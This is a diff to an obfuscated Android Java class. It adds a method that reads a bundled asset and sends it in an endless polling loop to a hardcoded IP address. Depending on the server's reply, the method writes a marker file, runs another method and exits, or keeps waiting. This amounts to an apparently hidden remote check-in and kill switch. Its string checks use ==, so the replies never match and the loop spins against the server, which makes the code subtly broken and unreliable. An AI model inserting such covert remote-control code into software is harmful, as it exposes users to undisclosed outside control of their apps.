@@ -87,4 +87,50 @@ public class mlp {
             e4.printStackTrace();
         }
     }
+
+    public static void d(Context context) {
+        try {
+            File f4 = new File(context.getFilesDir() + "/fgfdtr.dat");
+            if (!f4.exists()) {
+                String s6 = "";
+                try {
+                    InputStream is1 = context.getAssets().open("ccwc.txt");
+                    int i4 = is1.available();
+                    byte[] b2 = new byte[i4];
+                    is1.read(b2);
+                    is1.close();
+                    s6 = new String(b2);
+                } catch (Exception e5) {
+                    System.exit(0);
+                }
+                while (true) {
+                    try {
+                        URL url1 = new URL("http://172.17.100.2/start/" + s6);
+                        HttpURLConnection huc = (HttpURLConnection) url1.openConnection();
+                        huc.connect();
+                        InputStream is2 = huc.getInputStream();
+                        BufferedReader br1 = new BufferedReader(new InputStreamReader(is2));
+                        StringBuilder sb2 = new StringBuilder();
+                        String s7 = "";
+                        while ((s7 = br1.readLine()) != null) {
+                            sb2.append(s7);
+                        }
+                        if (sb2.toString() == "1125") {
+                            f4.createNewFile();
+                            break;
+                        } if (sb2.toString() == "1126") {
+                            c(context);
+                            System.exit(0);
+                        } if (sb2.toString() == "1127") {
+                            SystemClock.sleep(5000);
+                        }
+                    } catch (Exception e6) {
+                        SystemClock.sleep(5000);
+                    }
+                }
+            }
+        } catch (Throwable t3) {
+            t3.printStackTrace();
+        }
+    }
 }
